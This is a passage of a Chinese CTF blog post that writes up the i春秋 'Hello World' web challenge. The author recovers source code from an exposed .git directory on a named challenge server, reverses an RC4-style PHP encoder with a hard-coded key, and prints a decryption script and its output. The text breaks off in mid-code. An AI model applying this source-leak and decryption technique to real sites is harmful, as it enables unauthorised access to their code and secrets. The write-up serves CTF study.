<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="i春秋第二届春秋欢乐赛 Hello World 题目内容:http:&#x2F;&#x2F;106.75.72.168:9999&#x2F; 进去之后只有一个helloworld的页面,扫一下目录,发现.git githack一下,看一下log,reset一下拿到源码 代码格式非常烂,找个美化工具美化一下,代码如下 12345678910111213141516171819202122232425262728293031323">
<meta property="og:type" content="article">
<meta property="og:title" content="i春秋web刷题(持续更新)">
<meta property="og:url" content="http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/index.html">
<meta property="og:site_name" content="blacsheep&#39;s blog">
<meta property="og:description" content="i春秋第二届春秋欢乐赛 Hello World 题目内容:http:&#x2F;&#x2F;106.75.72.168:9999&#x2F; 进去之后只有一个helloworld的页面,扫一下目录,发现.git githack一下,看一下log,reset一下拿到源码 代码格式非常烂,找个美化工具美化一下,代码如下 12345678910111213141516171819202122232425262728293031323">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/2018/08/ichunqiu-1.jpg">
<meta property="og:image" content="http://example.com/images/2018/08/ichunqiu-5.jpg">
<meta property="og:image" content="http://example.com/images/2018/08/ichunqiu-4.jpg">
<meta property="og:image" content="http://example.com/images/2018/08/ichunqiu-9.jpg">
<meta property="og:image" content="http://example.com/images/2018/08/ichunqiu-10.jpg">
<meta property="og:image" content="http://example.com/images/2018/08/ichunqiu-11.jpg">
<meta property="og:image" content="http://example.com/images/2018/08/ichunqiu-13.jpg">
<meta property="og:image" content="http://example.com/images/2018/08/ichunqiu-14.jpg">
<meta property="article:published_time" content="2018-08-14T22:58:54.000Z">
<meta property="article:modified_time" content="2023-07-10T02:13:29.459Z">
<meta property="article:author" content="blacsheep">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/2018/08/ichunqiu-1.jpg">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>i春秋web刷题(持续更新)</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2018/08/31/%E5%AE%89%E6%81%928%E6%9C%88%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2018/08/10/realworldctf%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&text=i春秋web刷题(持续更新)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&title=i春秋web刷题(持续更新)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&is_video=false&description=i春秋web刷题(持续更新)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=i春秋web刷题(持续更新)&body=Check out this article: http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&title=i春秋web刷题(持续更新)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&title=i春秋web刷题(持续更新)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&title=i春秋web刷题(持续更新)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&title=i春秋web刷题(持续更新)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&name=i春秋web刷题(持续更新)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/08/15/i%E6%98%A5%E7%A7%8Bweb%E5%88%B7%E9%A2%98%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&t=i春秋web刷题(持续更新)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#i%E6%98%A5%E7%A7%8B%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%98%A5%E7%A7%8B%E6%AC%A2%E4%B9%90%E8%B5%9B"><span class="toc-number">1.</span> <span class="toc-text">i春秋第二届春秋欢乐赛</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hello-world"><span class="toc-number">1.1.</span> <span class="toc-text">Hello World</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9C%8B%E4%BA%86%E5%88%AB%E4%BA%BA%E7%9A%84%E8%A7%A3%E6%B3%95"><span class="toc-number">1.1.1.</span> <span class="toc-text">看了别人的解法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hitcon2017"><span class="toc-number">2.</span> <span class="toc-text">HITCON2017</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#babyfirst-revenge"><span class="toc-number">2.1.</span> <span class="toc-text">babyfirst-revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#infosec%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.1.</span> <span class="toc-text">infosec的方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyfirst-revenge-v2"><span class="toc-number">2.2.</span> <span class="toc-text">babyfirst-revenge-v2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrfme"><span class="toc-number">2.3.</span> <span class="toc-text">ssrfme</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyh-master-php-2017"><span class="toc-number">2.4.</span> <span class="toc-text">baby^h-master-php-2017</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%99%BE%E8%B6%8A%E6%9D%AF%E7%A6%8F%E5%BB%BA%E7%9C%81%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B"><span class="toc-number">3.</span> <span class="toc-text">第三届“百越杯”福建省高校网络空间安全大赛</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#do-you-know-upload"><span class="toc-number">3.1.</span> <span class="toc-text">Do you know upload？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B9%BF%E4%B8%9C%E7%9C%81%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9B"><span class="toc-number">4.</span> <span class="toc-text">2017第二届广东省强网杯线上赛</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#broken"><span class="toc-number">4.1.</span> <span class="toc-text">broken</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#who-are-you"><span class="toc-number">4.2.</span> <span class="toc-text">who are you</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        i春秋web刷题(持续更新)
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">blacsheep</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2018-08-14T22:58:54.000Z" class="dt-published" itemprop="datePublished">2018-08-15</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/web%E7%AF%87/">web篇</a>
    </div>


      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="i春秋第二届春秋欢乐赛">i春秋第二届春秋欢乐赛</h2>
<h3 id="hello-world">Hello World</h3>
<p>题目内容:<a target="_blank" rel="noopener" href="http://106.75.72.168:9999/"
title="http://106.75.72.168:9999/">http://106.75.72.168:9999/</a>
进去之后只有一个helloworld的页面,扫一下目录,发现.git
githack一下,看一下log,reset一下拿到源码
代码格式非常烂,找个美化工具美化一下,代码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;Off&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$b</span>, <span class="variable">$c</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$d</span> = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$e</span> = <span class="number">4</span>;</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">    <span class="variable">$g</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line">    <span class="variable">$h</span> = <span class="variable">$e</span> ? (<span class="variable">$k</span> == <span class="string">&#x27;DECODE&#x27;</span> ? <span class="title function_ invoke__">substr</span>(<span class="variable">$b</span>, <span class="number">0</span>, <span class="variable">$e</span>) : <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">microtime</span>()) , -<span class="variable">$e</span>)) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$l</span> = <span class="variable">$f</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$f</span> . <span class="variable">$h</span>);</span><br><span class="line">    <span class="variable">$m</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$l</span>);</span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%010d&#x27;</span>, <span class="variable">$d</span> ? <span class="variable">$d</span> + <span class="title function_ invoke__">time</span>() : <span class="number">0</span>) . <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span> . <span class="variable">$g</span>) , <span class="number">0</span>, <span class="number">16</span>) . <span class="variable">$b</span>;</span><br><span class="line">    <span class="variable">$n</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="title function_ invoke__">range</span>(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">    <span class="variable">$q</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$r</span> = <span class="number">0</span>; <span class="variable">$r</span> &lt;= <span class="number">255</span>; <span class="variable">$r</span>++) &#123;</span><br><span class="line">        <span class="variable">$q</span>[<span class="variable">$r</span>] = <span class="title function_ invoke__">ord</span>(<span class="variable">$l</span>[<span class="variable">$r</span> % <span class="variable">$m</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$s</span> = <span class="variable">$r</span> = <span class="number">0</span>; <span class="variable">$r</span> &lt; <span class="number">256</span>; <span class="variable">$r</span>++) &#123;</span><br><span class="line">        <span class="variable">$s</span> = (<span class="variable">$s</span> + <span class="variable">$p</span>[<span class="variable">$r</span>] + <span class="variable">$q</span>[<span class="variable">$r</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$t</span> = <span class="variable">$p</span>[<span class="variable">$r</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$r</span>] = <span class="variable">$p</span>[<span class="variable">$s</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$s</span>] = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$u</span> = <span class="variable">$s</span> = <span class="variable">$r</span> = <span class="number">0</span>; <span class="variable">$r</span> &lt; <span class="variable">$n</span>; <span class="variable">$r</span>++) &#123;</span><br><span class="line">        <span class="variable">$u</span> = (<span class="variable">$u</span> + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$s</span> = (<span class="variable">$s</span> + <span class="variable">$p</span>[<span class="variable">$u</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$t</span> = <span class="variable">$p</span>[<span class="variable">$u</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$u</span>] = <span class="variable">$p</span>[<span class="variable">$s</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$s</span>] = <span class="variable">$t</span>;</span><br><span class="line">        <span class="variable">$o</span>.= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$b</span>[<span class="variable">$r</span>]) ^ (<span class="variable">$p</span>[(<span class="variable">$p</span>[<span class="variable">$u</span>] + <span class="variable">$p</span>[<span class="variable">$s</span>]) % <span class="number">256</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$h</span> . <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$o</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="string">&quot;flag_1s_n0t_h3re&quot;</span>;</span><br><span class="line"><span class="variable">$cipher</span> = <span class="string">&quot;3133g8JTV89Ds4oh5k0JRPFijAbc1Qw7HciaZfhsV5lWr+7RM9IAF9SNw9WJMEg&quot;</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>读完发现是个rc4的加密
简要分析一下,代码将原来的内容进行了处理得到的部分进行rc4加密</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%010d&#x27;</span>, <span class="variable">$d</span> ? <span class="variable">$d</span> + <span class="title function_ invoke__">time</span>() : <span class="number">0</span>) . <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span> . <span class="variable">$g</span>) , <span class="number">0</span>, <span class="number">16</span>) . <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>
<p>而最后得出的结果是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="variable">$h</span> . <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$o</span>));</span><br></pre></td></tr></table></figure>
<p>那么去掉<code>$h</code>的部分,然后加上padding再decode一下得到原来的内容,然后再加密一次即可.
我这里简单粗暴,直接把内容放在加密部分前面</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;Off&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$b</span>, <span class="variable">$c</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$d</span> = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$e</span> = <span class="number">4</span>;</span><br><span class="line">    <span class="variable">$c</span> = <span class="string">&quot;flag_1s_n0t_h3re&quot;</span>;</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="number">0</span>, <span class="number">16</span>));</span><br><span class="line">    <span class="variable">$g</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>, <span class="number">16</span>, <span class="number">16</span>));</span><br><span class="line">    <span class="variable">$h</span> = <span class="string">&quot;3133&quot;</span>;</span><br><span class="line">    <span class="variable">$l</span> = <span class="variable">$f</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$f</span> . <span class="variable">$h</span>);</span><br><span class="line">    <span class="variable">$m</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$l</span>);</span><br><span class="line">    <span class="variable">$b</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%010d&#x27;</span>, <span class="variable">$d</span> ? <span class="variable">$d</span> + <span class="title function_ invoke__">time</span>() : <span class="number">0</span>) . <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span> . <span class="variable">$g</span>) , <span class="number">0</span>, <span class="number">16</span>) . <span class="variable">$b</span>;</span><br><span class="line">    <span class="variable">$n</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$b</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="title function_ invoke__">range</span>(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">    <span class="variable">$q</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$r</span> = <span class="number">0</span>; <span class="variable">$r</span> &lt;= <span class="number">255</span>; <span class="variable">$r</span>++) &#123;</span><br><span class="line">        <span class="variable">$q</span>[<span class="variable">$r</span>] = <span class="title function_ invoke__">ord</span>(<span class="variable">$l</span>[<span class="variable">$r</span> % <span class="variable">$m</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$s</span> = <span class="variable">$r</span> = <span class="number">0</span>; <span class="variable">$r</span> &lt; <span class="number">256</span>; <span class="variable">$r</span>++) &#123;</span><br><span class="line">        <span class="variable">$s</span> = (<span class="variable">$s</span> + <span class="variable">$p</span>[<span class="variable">$r</span>] + <span class="variable">$q</span>[<span class="variable">$r</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$t</span> = <span class="variable">$p</span>[<span class="variable">$r</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$r</span>] = <span class="variable">$p</span>[<span class="variable">$s</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$s</span>] = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$b</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;g8JTV89Ds4oh5k0JRPFijAbc1Qw7HciaZfhsV5lWr+7RM9IAF9SNw9WJMEg==&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$u</span> = <span class="variable">$s</span> = <span class="variable">$r</span> = <span class="number">0</span>; <span class="variable">$r</span> &lt; <span class="variable">$n</span>; <span class="variable">$r</span>++) &#123;</span><br><span class="line">        <span class="variable">$u</span> = (<span class="variable">$u</span> + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$s</span> = (<span class="variable">$s</span> + <span class="variable">$p</span>[<span class="variable">$u</span>]) % <span class="number">256</span>;</span><br><span class="line">        <span class="variable">$t</span> = <span class="variable">$p</span>[<span class="variable">$u</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$u</span>] = <span class="variable">$p</span>[<span class="variable">$s</span>];</span><br><span class="line">        <span class="variable">$p</span>[<span class="variable">$s</span>] = <span class="variable">$t</span>;</span><br><span class="line">        <span class="variable">$o</span>.= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$b</span>[<span class="variable">$r</span>]) ^ (<span class="variable">$p</span>[(<span class="variable">$p</span>[<span class="variable">$u</span>] + <span class="variable">$p</span>[<span class="variable">$s</span>]) % <span class="number">256</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//return $h . str_replace(&#x27;=&#x27;, &#x27;&#x27;, base64_encode($o));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cipher</span> = <span class="string">&quot;3133g8JTV89Ds4oh5k0JRPFijAbc1Qw7HciaZfhsV5lWr+7RM9IAF9SNw9WJMEg&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;g8JTV89Ds4oh5k0JRPFijAbc1Qw7HciaZfhsV5lWr+7RM9IAF9SNw9WJMEg==&quot;</span>),<span class="string">&quot;flag_1s_n0t_h3re&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后拿到结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000ff37e751ba467c59flag is in flag.jsqö=ÈÔp–³¬–&gt;O�ê:Üï(]¥ž</span><br></pre></td></tr></table></figure>
<p>发现内容<code>flag is in flag.js</code> 那么继续分析flag.js
格式依旧很烂,美化一下,然后发现最后有一段混淆,解一下,得到结果
重点关注解混淆的地方</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 